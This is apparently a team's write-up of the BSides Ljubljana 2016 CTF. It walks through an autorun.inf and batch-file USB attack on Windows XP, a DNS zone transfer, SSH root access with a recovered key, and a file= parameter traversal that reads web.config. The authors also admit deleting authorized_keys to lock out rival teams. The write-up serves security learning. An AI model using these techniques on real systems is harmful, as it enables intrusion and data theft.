---
layout: post
title:  "BSides Ljubljana CTF 2016"
author: f0rki, verr
categories: writeup
---

We won the CTF at the BSides Ljubljana conference, which happened at 9. March.
This was not like a typical jeopardy CTF, which was kind of refreshing. It
feeled more like a penetration test. The Tasks were split in two categories:
Jeopardy and Hacking. There were 5 Jeopardy Tasks and another couple of Hacking
Tasks. The jeopardy tasks were pretty clear and similar to other CTFs. For the
Hacking tasks we were given a network range and tasked to find the flags. The
flags were scattered all over the services that were running in the target
network. The flag format was `CTF#N:Keyword`, with `N` being the challenge
number.

It was kind of fun although we missed a lot of flags, which we just overlooked.
In the middle of the game we revisited all the services to search for flags
again. This revealed quite a lot of the flags, which weren't worth so many
points.

## Jeopardy Tasks

TODO: verr other jeopardy tasks

### Extract flag file from Windows XP machine with only USB stick

There was a physical machine there running Windows XP. We were only allowed to
plug in a usb stick and the plug it out again. So we googled a little an
apparently unpatched Windows XP versions run autorun stuff automatically from
USB sticks. So we created a usb stick with the `autorun.inf` file:
```
[AutoRun]
UseAutoPlay=1
open=pwn.bat
```

Of course we didn't have a Windows XP VM ready, so it was kind of hard to test.
We needed several attempts, for which one of us had to get up and walk to the
computer plug it in and watch it fail. Too bad we don't know how
to windows... In the end we still don't know which one of the copy commands was
the right one, but we got the flag, so whatever.

```
@echo off

echo hmmm

copy "%HOMEPATH%\Desktop\flag.txt"
copy "%HOMEPATH%\Desktop\flag.txt" .
copy "%HOMEPATH%\Desktop\flag.txt" "%CD%"
copy "%HOMEPATH%\Desktop\flag.txt" D:\
copy "C:\Documents and Settings\Administrator\Desktop\flag.txt" D:\
copy "C:\Documents and Settings\CTF\Desktop\flag.txt" D:\

echo "#### CWD" >>listing.log
echo %CD% >>listing.log
dir >>listing.log
echo "#### home/desktop" >> listing.log
cd "%HOMEPATH%"
dir >>D:\listing.log
echo "#### desktop" >> D:\listing.log
cd Desktop
dir >>D:\listing.log

echo "#### users" >> D:\listing.log
cd ..
dir >>D:\listing.log
```



### Task 6

We are given a "pseudo code" description of a simple cipher and the task was to
submit the ciphertext. Below is the

```python
"""
key is "iamsobroken"
cipher is hex string
while char at message; do

temp is hex char XOR hex key at index of char MOD key length
append temp to cipher

done
"""

key = "iamsobroken"
message = "I have a bad feeling about Asterix"
cipher = []

for i, m in enumerate(message):
    m = ord(m)
    k = ord(key[(i) % len(key)])
    t = m ^ k
    cipher.append(t)

#print "".join(chr(c) for c in cipher)
print "".join(hex(c)[2:].zfill(2) for c in cipher)
```

### Retrieve contents of the floppy disk badge

We first tried to use the old Windows XP computer, to get the contents of the
floppy but the drive was not connected. But one of the organizers at the
front-desk had a USB floppy drive, so we nicely asked to borrow it. That way we
retrieved the `FLAG.txt` file from the floppy and a file called `faq-root`,
which will become important.


## Hacking Tasks

### The network setup

```
Nmap scan report for 192.168.66.1
Host is up (0.0054s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 192.168.66.5
Host is up (0.0047s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
443/tcp  open  https          -- ctf#16 remote login
3389/tcp open  ms-wbt-server
4444/tcp open  krb524

Nmap scan report for 192.168.66.6
Host is up (0.0073s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http            -- starting point: qr code #13, android app, also validateqr
4444/tcp open  krb524

Nmap scan report for 192.168.66.7
Host is up (0.0075s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh              -- login via faq-root key --> #5 in mysql db
80/tcp   open  http             -- FAQ service
4444/tcp open  krb524

Nmap scan report for 192.168.66.8
Host is up (0.0075s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http             -- posbox --> posbox .net app, 404 page
4444/tcp open  krb524

Nmap scan report for 192.168.66.15
Host is up (0.0039s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE  VERSION
53/tcp   open  domain   ISC BIND 1.0
```

We could get the hostnames of the machines by using reverse lookups at
`192.168.66.15` or doing a DNS zone transfer.

```
$ dig @192.168.66.15 fars.si AXFR

; <<>> DiG 9.10.3-P3-RedHat-9.10.3-10.P3.fc23 <<>> @192.168.66.15 fars.si AXFR
; (1 server found)
;; global options: +cmd
fars.si.                       604800        IN        SOA        ns1.fars.si. admin.fars.si. 4 604800 86400 2419200 604800
fars.si.                       604800        IN        NS        ns1.fars.si.
faq.fars.si.                   604800        IN        A         192.168.66.7
ns1.fars.si.                   604800        IN        A         192.168.66.15
posbox.fars.si.                604800        IN        A         192.168.66.8
remote.fars.si.                604800        IN        A         192.168.66.5
reverselookupeverything.fars.si. 604800      IN        A         192.168.66.251
www.fars.si.                   604800        IN        A         192.168.66.6
fars.si.                       604800        IN        SOA       ns1.fars.si. admin.fars.si. 4 604800 86400 2419200 604800
;; Query time: 3 msec
;; SERVER: 192.168.66.15#53(192.168.66.15)
;; WHEN: Wed Mar 09 14:36:40 CET 2016
;; XFR size: 9 records (messages 1, bytes 263)
```

We set up our host files to contain the hostnames:

```
192.168.66.5 remote.fars.si
192.168.66.6 validateqr.fars.si
192.168.66.7 faq.fars.si
192.168.66.8 posbox.fars.si
192.168.66.15 ns1.fars.si
```

### Welcome page at 192.168.66.6

Visiting `192.168.66.6` gave us a welcome page with a link to a file called
`qr.txt` and `app.apk`. It also contained a link to the FAQ system on
`192.168.66.7`.


### Reading the QR code

`qr.txt` was a text file the contained a QR code that was converted to ascii
art. Using a 1px font size in gedit gives the following pictures, which we were
not able to scan yet:

![](/images/posts/2016-03-17-blctf-qr-gedit.png)

We took a screenshot and did some post processing in gimp to make the contrast
higher. This was good enough to be scanned:

![](/images/posts/2016-03-17-blctf-qr-post.png)


### Decompiling the android app


TODO: verr

```
$ pss -i "this.flag"
./com/prosoft/posbox/business/api/service/helpers/NetworkRequestParams.java
22:        this.flag = "Q1RGIzE3OiBIb3cgbWFueSBmbGFncyBkaWQgeW91IG1pc3M/";
36:        this.flag = "Q1RGIzE3OiBIb3cgbWFueSBmbGFncyBkaWQgeW91IG1pc3M/";

$ echo "Q1RGIzE3OiBIb3cgbWFueSBmbGFncyBkaWQgeW91IG1pc3M/" | base64 -d
CTF#17: How many flags did you miss?
```


### SNMP

`HINT: SNMP`

TODO: verr


### getting root on FAQ system

The floppy also contained a file called `faq-root`, which contained a ssh
private key. Unfortunately the key is password protected. From the name of the
file, it was pretty clear that this was the way to login at 192.168.66.7 as
root. The sometime in the middle of the CTf the following hint was released:

    HINT: Try to link the contest of your floppy and the Morse code on it!

Even before the CTF started we noticed that there is a morse code on badge,
which we immediately decoded:

    -... ... .. -.. . ... .-.. .--- ..- -... .-.. .--- .- -. .- ----- -..- --... . -----

    BSIDESLJUBLJANA0X7E0

And it was actually the password for the the ssh key.

    ssh -i ./root-faq root@192.168.66.7
    # cat FLAG
    CTF#6:DON'T WASTE YOUR TIME HERE ANYMORE!
    actual submission:
    DONTWASTEYOURTIMEHEREANYMORE

Now we did something pretty nasty on the system. We removed the original
`authorized_keys` file to delay other teams. Not exactly fair play, but it was
also not explicitly forbidden to do so. Of course this was noticed at one point
and the organizers restored the VM snapshot.

    $ cat mysql
    SET PASSWORD FOR 'root'@'localhost' = PASSWORD('mysql.pass');

There was also a file with the mysql root password (of course we could've also
changed that one). So we explored and dumped the database using mysqldump. We
then grepped for flags in the sql dump, which revealed another flag.

    cat dump.sql | grep -i ctf
    INSERT INTO `faqfaqnews` VALUES (1,'sl','Novica','<p>Fars sistem razpadel</p>\r\n<p> </p>\r\n<p> </p>\r\n<p>CTF#5 Backend</p>','20160229215345','Admin','milan.gabor@gmail.com','n','n','00000000000000','99991231235959','http://www.fars.si','','');

We don't know if this flag was supposed to be retrieved via the FAQ web
service.


### Flags in the webservices

 - The FAQ system set a Cookie that contained the flag.
 - XXX sent a custom HTTP header containing a flag TODO: verr which one?
 - If you were logged in the source of the 404 page of `posbox.fars.si`
   contained a flag if logged in.
 - Visiting `192.168.66.5` with the hostname `remote.fars.si` over https
   revealed a flag.
   ![](/images/posts/2016-03-17-blctf-remote-fars-si.png)

### The .net posbox app

So the download link for the App installer was:
`http://posbox.fars.si/home?file=setup.exe`


TODO: verr

somewhere in the middle of the code there was the following line, which we used
to login to the posbox web interface.

```C#
if (this.Username == "fars@bsidesljubljana.si" && this.Password == "SuperSecurePassword")
```


### Retrieving the web.config

We got a hint from one of the organizers to look at posbox again. We tried to
get `/etc/passwd` on the posbox host using the `file=` http parameter, but he
reminded us the this was windows running IIS and we should try `web.config`.
`http://posbox.fars.si/home?file=web.config` actually worked.

Here we can see database credentials, which are also a flag. We haven't used
the credentials for anything else, since the database wasn't available over the
network.

```
<configuration>
  <system.webServer>
    <handlers>
      <add name="httpplatformhandler" path="*" verb="*" modules="httpPlatformHandler" resourceType="Unspecified" />
    </handlers>
    <httpPlatform processPath="..\approot\web.cmd" arguments="" stdoutLogEnabled="false" stdoutLogFile="..\logs\stdout.log" startupTimeLimit="3600"></httpPlatform>
  </system.webServer>
  <connectionStrings>
    <add name="CTF#9" connectionString="server=localhost;database=myDb;uid=myUser;password=HereWeAreHereWeGo;" />
                <!-- CTF9: HereWeAreHereWeGo-->
  </connectionStrings>
  <system.serviceModel>
    <bindings>
      <basicHttpBinding>
        <binding name="BasicHttpBinding_IQRValidator" />
      </basicHttpBinding>
    </bindings>
    <client>
      <endpoint address="http://validateqr.fars.si/QRValidator.svc" binding="basicHttpBinding" bindingConfiguration="BasicHttpBinding_IQRValidator" contract="ServiceReference1.IQRValidator" name="BasicHttpBinding_IQRValidator" />
    </client>
  </system.serviceModel>
</configuration>
```

But we can see the validateqr endpoint is a hint for the next challenge.

### posbox readme.html

Pretty late in the CTF the following hint was released:

    HINT: posbox.fars.si/logs

There you could retrieve a IIS log file and also the `readme.html` file:

```
<!DOCTYPE html>
<html>
<head>
</head>
<body>
  	<div style="display: none;">INKEMIZRGA5CAQTBONSUK3TDN5SGKZCCNFTUI4TBM5XW44Y=</div>
</body>
</html>
```

This is base32 encoded

```
>>> base64.b32decode("INKEMIZRGA5CAQTBONSUK3TDN5SGKZCCNFTUI4TBM5XW44Y=")
'CTF#10: BaseEncodedBigDragons'
```

I think we found this one a little too late, shortly after the CTF was over
(which we didn't realize for 20 minutes or so).


### validateqr.fars.si

`http://validateqr.fars.si/QRValidator.svc` was running on `192.168.66.6`,
which we found by trial and error. We could retrieve the WSDL file but didn't
manage to actually do something remotely useful with the web service.

Apparently we should've used xml external entities to retrieve further
credentials.
